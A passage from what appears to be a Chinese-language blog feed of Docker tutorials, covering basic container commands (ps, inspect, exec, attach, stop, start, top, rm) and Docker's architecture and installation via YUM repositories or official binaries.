keyword">var</span>dev  home  lib64  media       opt  root  sbin  sys  usr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">退出命令执行，观察容器运行情况<span class="token namespace">[root@948f234e22a1 /]</span><span class="token comment"># exit</span><span class="token keyword">exit</span><span class="token namespace">[root@localhost ~]</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-2-docker-ps"><a href="#2-3-2-docker-ps" class="headerlink" title="2.3.2 docker ps"></a>2.3.2 docker ps</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">命令解释docker <span class="token function">ps</span> 查看正在运行的容器，本案例由于没有命令在容器中运行，因此容器被停止了，所以本次查看没有结果。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps --all</span>CONTAINER ID   IMAGE           COMMAND     CREATED             STATUS                         PORTS     NAMES948f234e22a1   centos:latest   <span class="token string">"bash"</span>    10 minutes ago      Exited <span class="token punctuation">(</span>0<span class="token punctuation">)</span> 2 minutes ago                    c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>CONTAINERID</th><th>IMAGE</th><th>COMMAND</th><th>CREATED</th><th>STATUS</th><th>PORTS</th><th>NAMES</th></tr></thead><tbody><tr><td>948f234e22a1</td><td>centos:latest</td><td>“bash”</td><td>10 minutes ago</td><td>Exited (0) 2 minutes ago</td><td></td><td>c1</td></tr></tbody></table><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">命令解释docker <span class="token function">ps</span> <span class="token operator">--</span>all 可以查看正在运行的和停止运行的容器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-3-3-docker-inspect"><a href="#2-3-3-docker-inspect" class="headerlink" title="2.3.3 docker inspect"></a>2.3.3 docker inspect</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run -it --name c2 centos:latest bash</span><span class="token namespace">[root@9f2eea16da4c /]</span><span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">操作说明在上述提示符处按住ctrl键，再按p键与q键，可以退出交互式的容器，容器会处于运行状态。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE           COMMAND   CREATED          STATUS          PORTS     NAMES9f2eea16da4c   centos:latest   <span class="token string">"bash"</span>    37 seconds ago   Up 35 seconds             c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">命令解释可以看到容器处于运行状态<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker inspect c2</span><span class="token string">"Networks"</span>: <span class="token punctuation">{</span>                <span class="token string">"bridge"</span>: <span class="token punctuation">{</span>                    <span class="token string">"IPAMConfig"</span>: null<span class="token punctuation">,</span>                    <span class="token string">"Links"</span>: null<span class="token punctuation">,</span>                    <span class="token string">"Aliases"</span>: null<span class="token punctuation">,</span>                    <span class="token string">"NetworkID"</span>: <span class="token string">"d3de2fdbc30ee36a55c1431ef3ae4578392e552009f00b2019b4720735fe5a60"</span><span class="token punctuation">,</span>                    <span class="token string">"EndpointID"</span>: <span class="token string">"d1a2b7609f2f73a6cac67229a4395eef293f695c0ac4fd6c9c9e6913c9c85c1c"</span><span class="token punctuation">,</span>                    <span class="token string">"Gateway"</span>: <span class="token string">"172.17.0.1"</span><span class="token punctuation">,</span>                    <span class="token string">"IPAddress"</span>: <span class="token string">"172.17.0.2"</span><span class="token punctuation">,</span>                    <span class="token string">"IPPrefixLen"</span>: 16<span class="token punctuation">,</span>                    <span class="token string">"IPv6Gateway"</span>: <span class="token string">""</span><span class="token punctuation">,</span>                    <span class="token string">"GlobalIPv6Address"</span>: <span class="token string">""</span><span class="token punctuation">,</span>                    <span class="token string">"GlobalIPv6PrefixLen"</span>: 0<span class="token punctuation">,</span>                    <span class="token string">"MacAddress"</span>: <span class="token string">"02:42:ac:11:00:02"</span><span class="token punctuation">,</span>                    <span class="token string">"DriverOpts"</span>: null                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">命令解释docker inpect 查看容器详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-3-4-docker-exec"><a href="#2-3-4-docker-exec" class="headerlink" title="2.3.4 docker  exec"></a>2.3.4 docker  exec</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker exec -it c2 ls /root</span>anaconda-ks<span class="token punctuation">.</span>cfg  anaconda-post<span class="token punctuation">.</span>log  original-ks<span class="token punctuation">.</span>cfg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">命令解释docker exec 在容器外实现与容器交互执行某命令<span class="token operator">-</span>it 交互式c2 正在运行的容器名称<span class="token function">ls</span> <span class="token operator">/</span>root 在正在运行的容器中运行相关的命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">下面命令与上面命令执行效果一致<span class="token comment"># docker exec c2 ls /root</span>anaconda-ks<span class="token punctuation">.</span>cfganaconda-post<span class="token punctuation">.</span>logoriginal-ks<span class="token punctuation">.</span>cfg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-5-docker-attach"><a href="#2-3-5-docker-attach" class="headerlink" title="2.3.5 docker attach"></a>2.3.5 docker attach</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看正在运行的容器<span class="token comment"># docker ps</span>CONTAINER ID   IMAGE           COMMAND   CREATED          STATUS          PORTS     NAMES9f2eea16da4c   centos:latest   <span class="token string">"bash"</span>    13 minutes ago   Up 13 minutes             c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token namespace">[root@localhost ~]</span><span class="token comment"># docker attach c2</span><span class="token namespace">[root@9f2eea16da4c /]</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">命令解释docker attach 类似于ssh命令，可以进入到容器中c2 正在运行的容器名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">说明docker attach 退出容器时，如不需要容器再运行，可直接使用<span class="token keyword">exit</span>退出；如需要容器继续运行，可使用ctrl+p+q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-3-6-docker-stop"><a href="#2-3-6-docker-stop" class="headerlink" title="2.3.6 docker stop"></a>2.3.6 docker stop</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE           COMMAND   CREATED          STATUS          PORTS     NAMES9f2eea16da4c   centos:latest   <span class="token string">"bash"</span>    22 minutes ago   Up 22 minutes             c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker stop 9f2eea</span>9f2eea<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps --all</span>CONTAINER ID   IMAGE           COMMAND                  CREATED          STATUS                       PORTS     NAMES9f2eea16da4c   centos:latest   <span class="token string">"bash"</span>                   22 minutes ago   Exited <span class="token punctuation">(</span>137<span class="token punctuation">)</span> 4 seconds ago             c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-3-7-docker-start"><a href="#2-3-7-docker-start" class="headerlink" title="2.3.7 docker start"></a>2.3.7 docker start</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps --all</span>CONTAINER ID   IMAGE           COMMAND     CREATED          STATUS                       PORTS     NAMES9f2eea16da4c   centos:latest   <span class="token string">"bash"</span>      22 minutes ago   Exited <span class="token punctuation">(</span>137<span class="token punctuation">)</span> 4 seconds ago              c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker start 9f2eea</span>9f2eea<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE           COMMAND   CREATED          STATUS          PORTS     NAMES9f2eea16da4c   centos:latest   <span class="token string">"bash"</span>    24 minutes ago   Up 16 seconds             c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-3-8-docker-top"><a href="#2-3-8-docker-top" class="headerlink" title="2.3.8  docker top"></a>2.3.8  docker top</h3><blockquote><p>在Docker Host查看容器中运行的进程信息</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker top c2</span>UID    PID     PPID      C      STIME        TTY              TIME                CMDroot  69040   69020      0      18:37       pts/0           00:00:00              bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>UID</th><th>PID</th><th>PPID</th><th>C</th><th>STIME</th><th>TTY</th><th>TIME</th><th>CMD</th></tr></thead><tbody><tr><td>root</td><td>69040</td><td>69020</td><td>0</td><td>18:37</td><td>pts/0</td><td>00:00:00</td><td>bash</td></tr></tbody></table><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">命令解释docker top 查看container内进程信息，指在docker host上查看，与docker exec <span class="token operator">-</span>it c2 <span class="token function">ps</span> <span class="token operator">-</span>ef不同。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">输出说明UID 容器中运行的命令用户IDPID 容器中运行的命令PIDPPID 容器中运行的命令父PID，由于PPID是一个容器，此可指为容器在Docker Host中进程IDC     占用CPU百分比STIME 启动时间TTY   运行所在的终端TIME  运行时间CMD   执行的命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-9-docker-rm"><a href="#2-3-9-docker-rm" class="headerlink" title="2.3.9 docker rm"></a>2.3.9 docker rm</h3><blockquote><p>如果容器已停止，使用此命令可以直接删除；如果容器处于运行状态，则需要提前关闭容器后，再删除容器。下面演示容器正在运行关闭后删除的方法。</p></blockquote><h4 id="2-3-9-1-指定删除容器"><a href="#2-3-9-1-指定删除容器" class="headerlink" title="2.3.9.1 指定删除容器"></a>2.3.9.1 指定删除容器</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE           COMMAND   CREATED      STATUS         PORTS     NAMES9f2eea16da4c   centos:latest   <span class="token string">"bash"</span>    2 days ago   Up 3 seconds             c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker stop c2</span>或<span class="token comment"># docker stop 9f2eea16da4c</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker rm c2</span>或<span class="token comment"># docker rm 9f2eea16da4c</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="2-3-9-2-批量删除容器"><a href="#2-3-9-2-批量删除容器" class="headerlink" title="2.3.9.2 批量删除容器"></a>2.3.9.2 批量删除容器</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps --all</span>CONTAINER ID   IMAGE           COMMAND          CREATED      STATUS                  PORTS    NAMES948f234e22a1   centos:latest   <span class="token string">"bash"</span>           2 days ago   Exited <span class="token punctuation">(</span>0<span class="token punctuation">)</span> 2 days ago            c101cb3e01273c   centos:latest   <span class="token string">"bash"</span>           2 days ago   Exited <span class="token punctuation">(</span>0<span class="token punctuation">)</span> 2 days ago            systemimage146d950fdfb33   nginx:latest    <span class="token string">"/docker-ent..."</span> 2 days ago   Exited <span class="token punctuation">(</span>0<span class="token punctuation">)</span> 2 days ago            upbeat_goldberg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps --all | awk '{if (NR&gt;=2){print $1}}' | xargs docker rm</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/03-rong-qi-guan-li-gong-ju-docker-sheng-tai-jia-gou-ji-bu-shu/rong-qi-guan-li-gong-ju-docker-sheng-tai-jia-gou-ji-bu-shu/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/03-rong-qi-guan-li-gong-ju-docker-sheng-tai-jia-gou-ji-bu-shu/rong-qi-guan-li-gong-ju-docker-sheng-tai-jia-gou-ji-bu-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="容器管理工具-Docker生态架构及部署"><a href="#容器管理工具-Docker生态架构及部署" class="headerlink" title="容器管理工具 Docker生态架构及部署"></a>容器管理工具 Docker生态架构及部署</h1><h1 id="一、Docker生态架构"><a href="#一、Docker生态架构" class="headerlink" title="一、Docker生态架构"></a>一、Docker生态架构</h1><h2 id="1-1-Docker-Containers-Are-Everywhere"><a href="#1-1-Docker-Containers-Are-Everywhere" class="headerlink" title="1.1 Docker Containers Are Everywhere"></a>1.1 Docker Containers Are Everywhere</h2><p>![image-20220118165726624](容器管理工具 Docker生态架构及部署.assets/image-20220118165726624.png)</p><h2 id="1-2-生态架构"><a href="#1-2-生态架构" class="headerlink" title="1.2 生态架构"></a>1.2 生态架构</h2><p>![image-20220118170228476](容器管理工具 Docker生态架构及部署.assets/image-20220118170228476.png)</p><h3 id="1-2-1-Docker-Host"><a href="#1-2-1-Docker-Host" class="headerlink" title="1.2.1 Docker Host"></a>1.2.1 Docker Host</h3><p>用于安装Docker daemon的主机，即为Docker Host，并且该主机中可基于容器镜像运行容器。</p><h3 id="1-2-2-Docker-daemon"><a href="#1-2-2-Docker-daemon" class="headerlink" title="1.2.2 Docker daemon"></a>1.2.2 Docker daemon</h3><p>用于管理Docker Host中运行的容器、容器镜像、容器网络等，管理由Containerd.io提供的容器。</p><h3 id="1-2-3-Registry"><a href="#1-2-3-Registry" class="headerlink" title="1.2.3 Registry"></a>1.2.3 Registry</h3><p>容器镜像仓库，用于存储已生成容器运行模板的仓库，用户使用时，可直接从容器镜像仓库中下载容器镜像，即容器运行模板，就可以运行容器镜像中包含的应用了。例如：Docker Hub,也可以使用Harbor实现企业私有的容器镜像仓库。</p><h3 id="1-2-4-Docker-client"><a href="#1-2-4-Docker-client" class="headerlink" title="1.2.4 Docker client"></a>1.2.4 Docker client</h3><p>Docker Daemon客户端工具，用于同Docker Daemon进行通信，执行用户指令，可部署在Docker Host上，也可以部署在其它主机，能够连接到Docker Daemon即可操作。</p><h3 id="1-2-5-Image"><a href="#1-2-5-Image" class="headerlink" title="1.2.5 Image"></a>1.2.5 Image</h3><p>把应用运行环境及计算资源打包方式生成可再用于启动容器的不可变的基础设施的模板文件，主要用于基于其启动一个容器。</p><h3 id="1-2-6-Container"><a href="#1-2-6-Container" class="headerlink" title="1.2.6 Container"></a>1.2.6 Container</h3><p>由容器镜像生成，用于应用程序运行的环境，包含容器镜像中所有文件及用户后添加的文件，属于基于容器镜像生成的可读写层，这也是应用程序活跃的空间。</p><h3 id="1-2-7-Docker-Dashboard"><a href="#1-2-7-Docker-Dashboard" class="headerlink" title="1.2.7 Docker Dashboard"></a>1.2.7 Docker Dashboard</h3><blockquote><p>仅限于MAC与Windows操作系统上安装使用。</p></blockquote><p>Docker Dashboard 提供了一个简单的界面，使您能够直接从您的机器管理您的容器、应用程序和映像，而无需使用 CLI 来执行核心操作。</p><p>![image-20220118185507047](容器管理工具 Docker生态架构及部署.assets/image-20220118185507047.png)</p><h2 id="1-3-Docker版本"><a href="#1-3-Docker版本" class="headerlink" title="1.3 Docker版本"></a>1.3 Docker版本</h2><ul><li>Docker-ce Docker社区版，主要用于个人开发者测试使用，免费版本</li><li>Docker-ee Docker企业版，主要用于为企业开发及应用部署使用，收费版本，免费试用一个月，2020年因国际政治原因曾一度限制中国企业使用。</li></ul><h1 id="二、Docker部署"><a href="#二、Docker部署" class="headerlink" title="二、Docker部署"></a>二、Docker部署</h1><blockquote><p>安装Docker-ce版本。</p></blockquote><h2 id="2-1-使用YUM源部署"><a href="#2-1-使用YUM源部署" class="headerlink" title="2.1 使用YUM源部署"></a>2.1 使用YUM源部署</h2><blockquote><p>YUM源可以使用官方YUM源、清华大学开源镜像站配置YUM源，也可以使用阿里云开源镜像站提供的YUM源，建议选择使用阿里云开源镜像站提供的YUM源，原因速度快。</p></blockquote><h3 id="2-1-1-获取阿里云开源镜像站YUM源文件"><a href="#2-1-1-获取阿里云开源镜像站YUM源文件" class="headerlink" title="2.1.1 获取阿里云开源镜像站YUM源文件"></a>2.1.1 获取阿里云开源镜像站YUM源文件</h3><p>![image-20220118181640863](容器管理工具 Docker生态架构及部署.assets/image-20220118181640863.png)</p><p>![image-20220118181837065](容器管理工具 Docker生态架构及部署.assets/image-20220118181837065.png)</p><p>![image-20220118182432607](容器管理工具 Docker生态架构及部署.assets/image-20220118182432607.png)</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在docker host上使用 wget下载到<span class="token operator">/</span>etc/yum<span class="token punctuation">.</span>repos<span class="token punctuation">.</span>d目录中即可。<span class="token comment"># wget -O /etc/yum.repos.d/docker-ce.repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>![image-20220118182749037](容器管理工具 Docker生态架构及部署.assets/image-20220118182749037.png)</p><h3 id="2-1-2-安装Docker-ce"><a href="#2-1-2-安装Docker-ce" class="headerlink" title="2.1.2 安装Docker-ce"></a>2.1.2 安装Docker-ce</h3><blockquote><p>在docker host上安装即可，本次使用YUM源中稳定版本，由于版本在不断更新，不同的时间安装版本也不相同，使用方法基本一致。</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">直接安装docker-ce，此为docker daemon，所有依赖将被yum自动安装，含docker client等。<span class="token comment"># yum -y install docker-ce</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>![image-20220118183627705](容器管理工具 Docker生态架构及部署.assets/image-20220118183627705.png)</p><h3 id="2-1-3-配置Docker-Daemon启动文件"><a href="#2-1-3-配置Docker-Daemon启动文件" class="headerlink" title="2.1.3 配置Docker Daemon启动文件"></a>2.1.3 配置Docker Daemon启动文件</h3><blockquote><p>由于Docker使用过程中会对Centos操作系统中的Iptables防火墙中的FORWARD链默认规划产生影响及需要让Docker Daemon接受用户自定义的daemon.json文件，需要要按使用者要求的方式修改。</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># vim /usr/lib/systemd/system/docker.service</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![image-20220118184308554](容器管理工具 Docker生态架构及部署.assets/image-20220118184308554.png)</p><p>![image-20220118184420795](容器管理工具 Docker生态架构及部署.assets/image-20220118184420795.png)</p><h3 id="2-1-4-启动Docker服务并查看已安装版本"><a href="#2-1-4-启动Docker服务并查看已安装版本" class="headerlink" title="2.1.4 启动Docker服务并查看已安装版本"></a>2.1.4 启动Docker服务并查看已安装版本</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">重启加载daemon文件<span class="token comment"># systemctl daemon-reload</span>启动docker daemon<span class="token comment"># systemctl start docker</span>设置开机自启动<span class="token comment"># systemctl enable docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">使用docker version客户端命令查看已安装docker软件版本<span class="token comment"># docker version</span>Client: Docker Engine <span class="token operator">-</span> Community 客户端 Version:           20<span class="token punctuation">.</span>10<span class="token punctuation">.</span>12 API version:       1<span class="token punctuation">.</span>41 Go version:        go1<span class="token punctuation">.</span>16<span class="token punctuation">.</span>12 Git commit:        e91ed57 Built:             Mon Dec 13 11:45:41 2021 OS/Arch:           linux/amd64 Context:           default Experimental:      trueServer: Docker Engine <span class="token operator">-</span> Community Docker管理引擎 Engine:  Version:          20<span class="token punctuation">.</span>10<span class="token punctuation">.</span>12  API version:      1<span class="token punctuation">.</span>41 <span class="token punctuation">(</span>minimum version 1<span class="token punctuation">.</span>12<span class="token punctuation">)</span>  Go version:       go1<span class="token punctuation">.</span>16<span class="token punctuation">.</span>12  Git commit:       459d0df  Built:            Mon Dec 13 11:44:05 2021  OS/Arch:          linux/amd64  Experimental:     false containerd:  Version:          1<span class="token punctuation">.</span>4<span class="token punctuation">.</span>12  GitCommit:        7b11cfaabd73bb80907dd23182b9347b4245eb5d runc:  Version:          1<span class="token punctuation">.</span>0<span class="token punctuation">.</span>2  GitCommit:        v1<span class="token punctuation">.</span>0<span class="token punctuation">.</span>2-0-g52b36a2 docker-init:  Version:          0<span class="token punctuation">.</span>19<span class="token punctuation">.</span>0  GitCommit:        de40ad0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-2-使用二进制文件部署"><a href="#2-2-使用二进制文件部署" class="headerlink" title="2.2 使用二进制文件部署"></a>2.2 使用二进制文件部署</h2><blockquote><p>官方不建议此种部署方式，主因为不能自动更新，在条件有限制的情况下使用。</p></blockquote><p>二进制安装参考网址：<a href="https://docs.docker.com/engine/install/binaries/">https://docs.docker.com/engine/install/binaries/</a></p><p>![image-20220118185625614](容器管理工具 Docker生态架构及部署.assets/image-20220118185625614.png)</p><p>![image-20220118185711358](容器管理工具 Docker生态架构及部署.assets/image-20220118185711358.png)</p><p>![image-20220118185814368](容器管理工具 Docker生态架构及部署.assets/image-20220118185814368.png)</p><p>![image-20220118185911155](容器管理工具 Docker生态架构及部署.assets/image-20220118185911155.png)</p><p>![image-20220118190235182](容器管理工具 Docker生态架构及部署.assets/image-20220118190235182.png)</p><p>![image-20220118190327846](容器管理工具 Docker生态架构及部署.assets/image-20220118190327846.png)</p><p>![image-20220118190507974](容器管理工具 Docker生态架构及部署.assets/image-20220118190507974.png)</p><p>![image-20220118190622614](容器管理工具 Docker生态架构及部署.assets/image-20220118190622614.png)</p><p>![image-20220118190654730](容器管理工具 Docker生态架构及部署.assets/image-20220118190654730.png)</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">获取二进制文件，此文件中包含dockerd与docker 2个文件。<span class="token comment"># wget https://download.docker.com/linux/static/stable/x86_64/docker-20.10.9.tgz</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">解压下载的文件<span class="token comment"># tar xf docker-20.10.9.tgz</span>查看解压出的目录<span class="token comment"># ls docker</span>containerd       containerd-shim-runc-v2  docker   docker-init   runccontainerd-shim  ctr                      dockerd  docker-proxy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">安装解压后的所有二进制文件<span class="token comment"># cp docker/* /usr/bin/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">运行Daemon<span class="token comment"># dockerd &amp;</span>会有大量的信息输出，停止后，直接回车即可使用。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>如果您需要使用其他选项启动守护程序，请相应地修改上述命令或创建并编辑文件<code>/etc/docker/daemon.json</code> 以添加自定义配置选项。</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">确认是否可以使用docker客户端命令<span class="token comment"># which docker</span><span class="token operator">/</span>usr/bin/docker使用二进制安装的docker客户端<span class="token comment"># docker version</span>Client: Version:           20<span class="token punctuation">.</span>10<span class="token punctuation">.</span>9 API version:       1<span class="token punctuation">.</span>41 Go version:        go1<span class="token punctuation">.</span>16<span class="token punctuation">.</span>8 Git commit:        c2ea9bc Built:             Mon Oct  4 16:03:22 2021 OS/Arch:           linux/amd64 Context:           default Experimental:      trueServer: Docker Engine <span class="token operator">-</span> Community Engine:  Version:          20<span class="token punctuation">.</span>10<span class="token punctuation">.</span>9  API version:      1<span class="token punctuation">.</span>41 <span class="token punctuation">(</span>minimum version 1<span class="token punctuation">.</span>12<span class="token punctuation">)</span>  Go version:       go1<span class="token punctuation">.</span>16<span class="token punctuation">.</span>8  Git commit:       79ea9d3  Built:            Mon Oct  4 16:07:30 2021  OS/Arch:          linux/amd64  Experimental:     false containerd:  Version:          v1<span class="token punctuation">.</span>4<span class="token punctuation">.</span>11  GitCommit:        5b46e404f6b9f661a205e28d59c982d3634148f8 runc:  Version:          1<span class="token punctuation">.</span>0<span class="token punctuation">.</span>2  GitCommit:        v1<span class="token punctuation">.</span>0<span class="token punctuation">.</span>2-0-g52b36a2d docker-init:  Version:          0<span class="token punctuation">.</span>19<span class="token punctuation">.</span>0  GitCommit:        de40ad0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/02-rong-qi-ji-zhu-she-ji-linux-nei-he-guan-jian-ji-zhu/rong-qi-ji-zhu-suo-she-ji-linux-nei-he-guan-jian-ji-zhu/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/02-rong-qi-ji-zhu-she-ji-linux-nei-he-guan-jian-ji-zhu/rong-qi-ji-zhu-suo-she-ji-linux-nei-he-guan-jian-ji-zhu/</url>
      
